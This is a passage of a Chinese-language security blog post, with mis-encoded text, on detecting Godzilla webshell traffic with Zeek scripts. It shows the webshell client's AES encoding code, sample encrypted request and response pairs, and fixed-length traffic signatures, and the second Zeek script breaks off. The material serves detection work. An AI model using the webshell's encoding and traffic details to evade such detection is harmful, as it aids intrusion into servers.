<h2 id="JSP-AES-BASE64"><a href="#JSP-AES-BASE64" class="headerlink" title="JSP AES BASE64"></a>JSP AES BASE64</h2><p>â€‹    JSP WebShell åˆ™é‡‡ç”¨äº†AESåŠ å¯†å½¢å¼ï¼ŒAESåŠ å¯†çš„keyã€‚åŒæ ·æ˜¯è®¡ç®—å¯†é’¥çš„MD5å€¼ï¼Œç„¶åå–å…¶å‰16ä½ç”¨äºåŠ å¯†ã€‚æ›´æ·±å…¥çš„åˆ†æå¤§å®¶å¯ä»¥å»å‚è€ƒï¼Œè¿™å¹¶ä¸æ˜¯æœ¬æ–‡çš„é‡ç‚¹ã€‚**<a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/285693.html">ã€åŸåˆ›ã€‘å“¥æ–¯æ‹‰GodzillaåŠ å¯†æµé‡åˆ†æ</a>**</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(ShellEntity context)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.shell = context;</span><br><span class="line">    <span class="keyword">this</span>.http = <span class="keyword">this</span>.shell.getHttp();</span><br><span class="line">    <span class="keyword">this</span>.key = <span class="keyword">this</span>.shell.getSecretKeyX();</span><br><span class="line">    <span class="keyword">this</span>.pass = <span class="keyword">this</span>.shell.getPassword();</span><br><span class="line">    String findStrMd5 = functions.md5(<span class="keyword">this</span>.pass + <span class="keyword">this</span>.key);</span><br><span class="line">    <span class="keyword">this</span>.findStrLeft = findStrMd5.substring(<span class="number">0</span>, <span class="number">16</span>).toUpperCase();</span><br><span class="line">    <span class="keyword">this</span>.findStrRight = findStrMd5.substring(<span class="number">16</span>).toUpperCase();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.encodeCipher = Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.decodeCipher = Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.encodeCipher.init(<span class="number">1</span>, <span class="keyword">new</span> SecretKeySpec(<span class="keyword">this</span>.key.getBytes(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">        <span class="keyword">this</span>.decodeCipher.init(<span class="number">2</span>, <span class="keyword">new</span> SecretKeySpec(<span class="keyword">this</span>.key.getBytes(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">        <span class="keyword">this</span>.payload = <span class="keyword">this</span>.shell.getPayloadModule().getPayload();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.payload != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.http.sendHttpResponse(<span class="keyword">this</span>.payload);</span><br><span class="line">            <span class="keyword">this</span>.state = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Log.error(<span class="string">&quot;payload Is Null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        Log.error(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] encode(<span class="keyword">byte</span>[] data) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">this</span>.pass + <span class="string">&quot;=&quot;</span> + URLEncoder.encode(functions.base64EncodeToString(<span class="keyword">this</span>.encodeCipher.doFinal(data)))).getBytes();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        Log.error(e);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] decode(<span class="keyword">byte</span>[] data) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.decodeCipher.doFinal(functions.base64Decode(findStr(data)));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        Log.error(e);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="ç‰¹å¾æå–"><a href="#ç‰¹å¾æå–" class="headerlink" title="ç‰¹å¾æå–"></a>ç‰¹å¾æå–</h1><p>â€‹        ç»“åˆä¸Šé¢çš„åˆ†æï¼Œä¼ ç»Ÿé€šè¿‡é™æ€ç‰¹å¾çš„åŒ¹é…æ–¹å¼å·²ä¸åœ¨é€‚ç”¨äºGodzilla WebShellæ£€æµ‹ã€‚ä¸è¿‡ï¼Œæˆ‘ä»¬å¯ä»¥å°†å¤šä¸ªç‰¹å¾è¿›è¡Œç»“åˆå®ç°ä¸€ä¸ªæ£€æµ‹çš„æ¨¡å‹æ¥å¯¹Godzilla PHP XOR BASE64 WebShellçš„æ£€æµ‹ã€‚ä¸‹é¢æˆ‘ä»¬æ¥åˆ—ä¸¾ä¸€ä¸‹æ£€æµ‹ç‰¹å¾ï¼š</p>
<ol>
<li><p><strong>é¢‘ç‡</strong></p>
<p>Godzillaè¿æ¥WebShellçš„æ—¶ä¼šåœ¨ä¸€æ¬¡TCPä¼šè¯ä¸­å‘èµ·<strong>3</strong>æ¬¡HTTP POSTè¯·æ±‚ã€‚</p>
<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Connect-1_req.png" alt="image-20211206111919028"></p>
<p>â€‹    æ³¨æ„çœ‹ä¸‹<code>uid</code>å‡ä¸º<code>CbhiAefsstFeAyCM6</code>è¡¨ç¤ºæ˜¯ä¸€æ¬¡TCPä¼šè¯è¯·æ±‚ã€‚</p>
<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Connect-1_req_uid.png" alt="image-20211206114412112"></p>
</li>
</ol>
<ol start="2">
<li><p><strong>é•¿åº¦</strong></p>
<p>Godzillaè™½ç„¶å¯¹ä¼ è¾“æ—¶çš„<code>payload</code>è¿›è¡Œäº†åŠ å¯†ï¼Œä½†æ˜¯åˆå§‹è¿æ¥æ—¶3æ¬¡è¯·æ±‚ä¸­çš„å†…å®¹æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥é€šè¿‡XOR + BASE64ç¼–ç åçš„é•¿åº¦æ˜¯ä¸å˜çš„ã€‚</p>
<ul>
<li><p>ç¬¬ä¸€æ¬¡è¯·æ±‚é•¿åº¦ï¼ˆ<strong>Value</strong>ï¼‰ï¼š<strong>52216</strong></p>
<p>â€‹    GodzillaåŠ è½½payload.phpæ–‡ä»¶å†…å®¹ä½œä¸º<code>payload</code>æ•°æ®ï¼Œå…¶ä¸­å®šä¹‰äº†ShellåŠŸèƒ½æ‰€éœ€çš„ä¸€ç³»åˆ—å‡½æ•°ï¼ŒGodzillaç¬¬ä¸€æ¬¡è¿æ¥Shellæ—¶ï¼Œä¼šå°†è¿™äº›å‡½æ•°å®šä¹‰å‘é€ç»™æœåŠ¡å™¨å¹¶å­˜å‚¨åœ¨sessionä¸­ï¼Œåç»­çš„Shellæ“ä½œåªéœ€è¦å‘é€å‡½æ•°åç§°ä»¥åŠå¯¹åº”çš„å‡½æ•°å‚æ•°å³å¯ã€‚</p>
</li>
</ul>
<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/PHP-Payload.png" alt="image-20211204004016084"></p>
<ul>
<li><p>ç¬¬ä¸€æ¬¡å“åº”é•¿åº¦ï¼š<strong>0</strong></p>
<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Connect-1_resp.png" alt="image-20211204005107879"></p>
</li>
<li><p>ç¬¬äºŒæ¬¡è¯·æ±‚é•¿åº¦ï¼ˆ<strong>Value</strong>ï¼‰ï¼š<strong>28</strong></p>
<ul>
<li>å¯†æ–‡ï¼š <code>CQNGDVtRLFJcUmEwNTg1FgEVRg==</code></li>
<li>æ˜æ–‡ï¼š<code>&#123;&#39;methodName&#39;: &#39;test&#39;&#125;</code></li>
</ul>
<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Connect-2_req.png" alt="image-20211204010342657"></p>
</li>
<li><p>ç¬¬äºŒæ¬¡å“åº”é•¿åº¦ï¼š<strong>64</strong></p>
<ul>
<li>å¯†æ–‡ï¼š<code>e+06ZTQ1YjMxNKj7Mzhyv7gfMGU0NQ==</code></li>
<li>æ˜æ–‡ï¼š<code>ok</code></li>
</ul>
<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Connect-2_resp.png" alt="image-20211204011821599"></p>
</li>
<li><p>ç¬¬ä¸‰æ¬¡è¯·æ±‚é•¿åº¦ï¼ˆ<strong>Value</strong>ï¼‰ï¼š<strong>40</strong></p>
<ul>
<li>å¯†æ–‡ï¼š<code>CQNGDVtRLFJcUmE5NTg1BQEScARHXAFAeFkFWw==</code></li>
<li>æ˜æ–‡ï¼š<code>&#123;&#39;methodName&#39;: &#39;getBasicsInfo&#39;&#125;</code></li>
</ul>
<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Connect-3_req.png" alt="image-20211204012318391"><em>æ³¨ï¼šç¬¬ä¸‰æ¬¡å“åº”æ•°æ®åŒ…ï¼Œä¸å¯ä½œä¸ºç‰¹å¾æå–ã€‚å› ä¸ºæ¯ä¸ªæœåŠ¡å™¨çš„åŸºç¡€ä¿¡æ¯ä¸ä¸€æ ·ï¼Œæ‰€ä»¥è¿”å›å†…å®¹é•¿åº¦ä¹Ÿä¸ä¸€æ ·ã€‚</em></p>
</li>
</ul>
</li>
<li><p><strong>å†…å®¹</strong></p>
<p>æœ‰çš„å°ä¼™ä¼´ä¼šå¥‡æ€ªï¼Œéƒ½å·²ç»åŠ å¯†äº†è¿˜èƒ½ä»å†…å®¹ä¸Šåšå“ªäº›åˆ¤æ–­ã€‚å…¶å®è¿˜æ˜¯å¯ä»¥æœ‰çš„ï¼Œåªä¸è¿‡å¹¶ä¸æ˜¯ä¼ ç»Ÿçš„â€œå¨èƒç‰¹å¾â€</p>
<ul>
<li>è¯·æ±‚ï¼š3æ¬¡è¯·æ±‚ä¸­çš„keyå‡<strong>ç›¸ç­‰</strong>ï¼Œæ­¤ä¾‹ä¸­ä¸ºï¼š<code>Happy</code></li>
</ul>
<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Connect-1_req_key.png" alt="image-20211206111328799"></p>
<ul>
<li>å“åº”ï¼šå“åº”æ•°æ®åŒ…ä¸­é¦–å°¾å„16ä½æ•°å€¼å¯æ»¡è¶³MD5çš„æå–<code>[a-z0-9]&#123;16&#125;.+[a-z0-9]&#123;16&#125;</code>ï¼Œä¸”2æ¬¡å“åº”åŒ…ä¸­çš„16ä½æ•°å€¼å‡<strong>ç›¸ç­‰</strong>ï¼›</li>
</ul>
<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Connect-2_resp_md5.png" alt="image-20211206105322612"></p>
<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Connect-3_resp_md5.png" alt="image-20211206110509962"></p>
</li>
</ol>
<h1 id="æ£€æµ‹æ¨¡å‹"><a href="#æ£€æµ‹æ¨¡å‹" class="headerlink" title="æ£€æµ‹æ¨¡å‹"></a>æ£€æµ‹æ¨¡å‹</h1><p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/image.jpeg" alt="image-20211208151817057"></p>
<h2 id="PHP-XOR-BASE64-1"><a href="#PHP-XOR-BASE64-1" class="headerlink" title="PHP XOR BASE64"></a>PHP XOR BASE64</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">@load base/frameworks/sumstats</span><br><span class="line"></span><br><span class="line">redef <span class="class"><span class="keyword">enum</span> <span class="title">Notice</span>:</span>:Type += </span><br><span class="line">  &#123;</span><br><span class="line">    WebShell_Godzilla_PHP_XOR_BASE64</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">## ä½¿ç”¨Summary Statistics Frameworkï¼ˆç»Ÿè®¡æ¡†æ¶ï¼‰å¯¹httpè¯·æ±‚è¿›è¡Œæµ‹é‡ã€‚</span><br><span class="line"><span class="function">event <span class="title">http_message_done</span><span class="params">(c: connection, is_orig: <span class="keyword">bool</span>, stat: http_message_stat)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (c?$http) &amp;&amp; (c$http?$status_code) &amp;&amp; (c$http?$method) &amp;&amp; (c$http?$client_body) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (c$http$status_code) == <span class="number">200</span> &amp;&amp; (c$http$method == <span class="string">&quot;POST&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      local key_str: <span class="built_in">string</span> = c$http$uid + <span class="string">&quot;#####&quot;</span> + cat(c$id$orig_h) + <span class="string">&quot;#####&quot;</span> + cat(c$id$orig_p) + <span class="string">&quot;#####&quot;</span> + cat(c$id$resp_h)+ <span class="string">&quot;#####&quot;</span> + cat(c$id$resp_p) + <span class="string">&quot;#####&quot;</span> + c$http$uri;</span><br><span class="line">      local observe_str: <span class="built_in">string</span> = cat(c$http$ts) + <span class="string">&quot;#####&quot;</span> + c$http$client_body + <span class="string">&quot;#####&quot;</span> + c$http$server_body + <span class="string">&quot;#####&quot;</span> + cat(c$http$request_body_len);</span><br><span class="line">      ## ç¬¬ä¸€æ­¥ï¼Œåˆ›å»ºä¸€ä¸ªè§‚å¯Ÿå™¨ï¼Œå°†æ•°æ®æ·»åŠ åˆ°è§‚å¯Ÿå™¨ä¸­ã€‚</span><br><span class="line">      SumStats::observe(<span class="string">&quot;godzilla_php_xor_base64_webshell_event&quot;</span>, [$str=key_str], [$str=observe_str]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">event <span class="title">zeek_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ## ç¬¬äºŒæ­¥ï¼Œæ ¹æ®æŒ‡å®šçš„è§‚å¯Ÿæµè¿›è¡Œå¤„ç†ï¼Œæ­¤å¤„é‡‡ç”¨è®¡ç®—å”¯ä¸€å€¼çš„æ–¹å¼ã€‚</span><br><span class="line">  local r1 = SumStats::Reducer($stream = <span class="string">&quot;godzilla_php_xor_base64_webshell_event&quot;</span>, $apply = <span class="built_in">set</span>(SumStats::UNIQUE));</span><br><span class="line">  ## ç¬¬ä¸‰æ­¥ï¼Œåˆ›å»ºæ±‡æ€»ç»Ÿè®¡ï¼Œä»¥ä¾¿æœ€ç»ˆå¯¹å…¶è¿›è¡Œå¤„ç†ã€‚ä¾‹ï¼šå½“åœ¨<span class="number">3</span>ç§’çš„æ—¶é—´çª—å†…æ»¡è¶³<span class="number">3</span>æ¬¡é˜ˆå€¼å°†ä¼šæ‰§è¡Œä»¥ä¸‹é€»è¾‘ï¼›</span><br><span class="line">  SumStats::create([$name = <span class="string">&quot;godzilla_php_xor_base64_webshell_event.unique&quot;</span>,</span><br><span class="line">                    $epoch = <span class="number">3</span>sec,</span><br><span class="line">                    $reducers = <span class="built_in">set</span>(r1),</span><br><span class="line">                    $threshold = <span class="number">3.0</span>,</span><br><span class="line">                    $threshold_val(key: SumStats::Key, result: SumStats::Result) =</span><br><span class="line">                      &#123;</span><br><span class="line">                      <span class="keyword">return</span> result[<span class="string">&quot;godzilla_php_xor_base64_webshell_event&quot;</span>]$num + <span class="number">0.0</span>;</span><br><span class="line">                      &#125;,</span><br><span class="line">                    $threshold_crossed(key: SumStats::Key, result: SumStats::Result) =</span><br><span class="line">                      &#123;</span><br><span class="line">                        <span class="keyword">if</span> ( result[<span class="string">&quot;godzilla_php_xor_base64_webshell_event&quot;</span>]$unique == <span class="number">3</span> )</span><br><span class="line">                        &#123;</span><br><span class="line">                          local sig1: <span class="keyword">bool</span> = F;</span><br><span class="line">                          local sig2: <span class="keyword">bool</span> = F;</span><br><span class="line">                          local sig3: <span class="keyword">bool</span> = F;</span><br><span class="line">                          local pass_str_set: <span class="built_in">set</span>[<span class="built_in">string</span>];</span><br><span class="line">                          local md5_str_set: <span class="built_in">set</span>[<span class="built_in">string</span>];</span><br><span class="line">                          local key_str_vector: <span class="built_in">vector</span> of <span class="built_in">string</span> = split_string(key$str, /#####/);</span><br><span class="line"></span><br><span class="line">                          <span class="keyword">for</span> ( value in result[<span class="string">&quot;godzilla_php_xor_base64_webshell_event&quot;</span>]$unique_vals )</span><br><span class="line">                          &#123;</span><br><span class="line">                            local observe_str_vector: <span class="built_in">vector</span> of <span class="built_in">string</span> = split_string(value$str, /#####/);</span><br><span class="line">                            local client_body = unescape_URI(observe_str_vector[<span class="number">1</span>]);</span><br><span class="line">                            local server_body = unescape_URI(observe_str_vector[<span class="number">2</span>]);</span><br><span class="line">                            local client_body_len = to_int(observe_str_vector[<span class="number">3</span>]);</span><br><span class="line">                            local offset = <span class="built_in">strstr</span>(client_body, <span class="string">&quot;=&quot;</span>);</span><br><span class="line">                            local client_body_value = client_body[offset: |client_body|];</span><br><span class="line"></span><br><span class="line">                            ## è·å–è¯·æ±‚å‚æ•°</span><br><span class="line">                            <span class="keyword">if</span> (offset &gt; <span class="number">1</span>)</span><br><span class="line">                              ## æœ¬ä¾‹ä¸­: Happy=CQNGDVtRLFJcUmEwNTg1FgEVRg%<span class="number">3</span>D%<span class="number">3</span>D</span><br><span class="line">                              add pass_str_set[client_body[<span class="number">0</span>: offset<span class="number">-1</span>]];</span><br><span class="line"></span><br><span class="line">                            ## å“åº”ä½“é•¿åº¦ &gt; <span class="number">0</span>ï¼Œæå–é¦–ä½å„<span class="number">16</span>å­—èŠ‚å¹¶æ£€æŸ¥æ˜¯å¦æ»¡è¶³MD5æ ¼å¼</span><br><span class="line">                            <span class="keyword">if</span> (|server_body| &gt; <span class="number">0</span>)</span><br><span class="line">                            &#123;</span><br><span class="line">                              ## æœ¬ä¾‹ä¸­: <span class="number">52f</span>0f23a94a8a3f0e+<span class="number">06</span>ZTQ1YjMxNKj7Mzhyv7gfMGU0NQ==<span class="number">468e329</span>e21eb39e8</span><br><span class="line">                              local server_body_str = server_body[<span class="number">0</span>: <span class="number">16</span>] + server_body[<span class="number">-16</span>: ];</span><br><span class="line">                              local server_body_md5 = find_all_ordered(server_body_str, /[a-zA-Z0<span class="number">-9</span>]&#123;<span class="number">32</span>&#125;/);</span><br><span class="line">                              <span class="keyword">if</span> (|server_body_md5| == <span class="number">0</span>)</span><br><span class="line">                                <span class="keyword">return</span>;</span><br><span class="line">                              add md5_str_set[server_body_str];</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            ## è¯·æ±‚ä½“é•¿åº¦ &gt; <span class="number">52216</span> &amp;&amp; å“åº”ä½“é•¿åº¦ = <span class="number">0</span></span><br><span class="line">                            <span class="keyword">if</span> ( (client_body_len &gt; <span class="number">52216</span>) &amp;&amp; (|server_body| == <span class="number">0</span>) )</span><br><span class="line">                              sig1 = T;</span><br><span class="line"></span><br><span class="line">                            ## è¯·æ±‚ä½“é•¿åº¦ = <span class="number">28</span> &amp;&amp; å“åº”ä½“é•¿åº¦ = <span class="number">64</span></span><br><span class="line">                            <span class="keyword">if</span> ( (|client_body_value| == <span class="number">28</span>) &amp;&amp; (|server_body| == <span class="number">64</span>) )</span><br><span class="line">                              sig2 = T;</span><br><span class="line"></span><br><span class="line">                            ## è¯·æ±‚ä½“é•¿åº¦ = <span class="number">40</span></span><br><span class="line">                            <span class="keyword">if</span> ( |client_body_value| == <span class="number">40</span> )</span><br><span class="line">                              sig3 = T;</span><br><span class="line">                          &#125;</span><br><span class="line"></span><br><span class="line">                          <span class="keyword">if</span> ( sig1 &amp;&amp; sig2 &amp;&amp; sig3 )</span><br><span class="line">                          &#123;</span><br><span class="line">                            ## åˆ¤æ–­<span class="number">3</span>æ¬¡è¯·æ±‚å‚æ•°æ˜¯å¦å”¯ä¸€</span><br><span class="line">                            ## åˆ¤æ–­å<span class="number">2</span>æ¬¡æå–çš„MD5å€¼æ˜¯å¦å”¯ä¸€</span><br><span class="line">                            <span class="keyword">if</span> ( (|pass_str_set| == <span class="number">1</span>) &amp;&amp; (|md5_str_set| == <span class="number">1</span>) )</span><br><span class="line">                            &#123;</span><br><span class="line">                              NOTICE([</span><br><span class="line">                                $note=WebShell_Godzilla_PHP_XOR_BASE64,</span><br><span class="line">                                $uid=key_str_vector[<span class="number">0</span>],</span><br><span class="line">                                $src=to_addr(key_str_vector[<span class="number">1</span>]),</span><br><span class="line">                                $dst=to_addr(key_str_vector[<span class="number">3</span>]),</span><br><span class="line">                                $msg=fmt(<span class="string">&quot;[+] Godzilla(PHP_XOR_BASE64) traffic Detected, %s:%s -&gt; %s:%s, WebShell URI: %s&quot;</span>, key_str_vector[<span class="number">1</span>], key_str_vector[<span class="number">2</span>], key_str_vector[<span class="number">3</span>], key_str_vector[<span class="number">4</span>], key_str_vector[<span class="number">5</span>]),</span><br><span class="line">                                $sub=cat(<span class="string">&quot;Godzilla traffic Detected&quot;</span>)</span><br><span class="line">                              ]);</span><br><span class="line">                            &#125;</span><br><span class="line">                          &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                      &#125;</span><br><span class="line">  ]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="JSP-AES-BASE64-1"><a href="#JSP-AES-BASE64-1" class="headerlink" title="JSP AES BASE64"></a>JSP AES BASE64</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">@load base/frameworks/sumstats</span><br><span class="line"></span><br><span class="line">redef <span class="class"><span class="keyword">enum</span> <span class="title">Notice</span>:</span>:Type += </span><br><span class="line">  &#123;</span><br><span class="line">    WebShell_Godzilla_JSP_AES_BASE64</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">event <span class="title">http_message_done</span><span class="params">(c: connection, is_orig: <span class="keyword">bool</span>, stat: http_message_stat)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( c?$http &amp;&amp; c$http?$status_code &amp;&amp; c$http?$method )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (c$http$status_code) == <span class="number">200</span> &amp;&amp; (c$http$method == <span class="string">&quot;POST&quot;</span>) &amp;&amp; (c$http?$client_body) )</span><br><span class="line">    &#123;</span><br><span class="line">      local key_str: <span class="built_in">string</span> = c$http$uid + <span class="string">&quot;#####&quot;</span> + cat(c$id$orig_h) + <span class="string">&quot;#####&quot;</span> + cat(c$id$orig_p) + <span class="string">&quot;#####&quot;</span> + cat(c$id$resp_h)+ <span class="string">&quot;#####&quot;</span> + cat(c$id$resp_p) + <span class="string">&quot;#####&quot;</span> + c$http$uri;</span><br><span class="line">      local observe_str: <span class="built_in">string</span> = cat(c$http$ts) + <span class="string">&quot;#####&quot;</span> + c$http$client_body + <span class="string">&quot;#####&quot;</span> + c$http$server_body + <span class="string">&quot;#####&quot;</span> + cat(c$http$request_body_len);</span><br><span class="line">      SumStats::observe(<span class="string">&quot;godzilla_jsp_aes_base64_webshell_event&quot;</span>, [$str=key_str], [$str=observe_str]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">event <span class="title">zeek_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  local r1 = SumStats::Reducer($stream = <span class="string">&quot;godzilla_jsp_aes_base64_webshell_event&quot;</span>, $apply = <span class="built_in">set</span>(SumStats::UNIQUE));</span><br><span class="line">  SumStats::create([$name = <span class="string">&quot;godzilla_jsp_aes_base64_webshell_event.unique&quot;</span>,</span><br><span class="line">                    $epoch = <span class="number">5</span>sec,</span><br><span class="line">                    $reducers = <span class="built_in">set</span>(r1),</span><br><span class="line">                    $threshold = <span class="number">3.0</span>,</span><br><span class="line">                    $threshold_val(key: SumStats::Key, result: SumStats::Result) =</span><br><span class="line">                      &#123;</span><br><span class="line">                      <span class="keyword">return</span> result[<span class="string">&quot;godzilla_jsp_aes_base64_webshell_event&quot;</span>]$num + <span 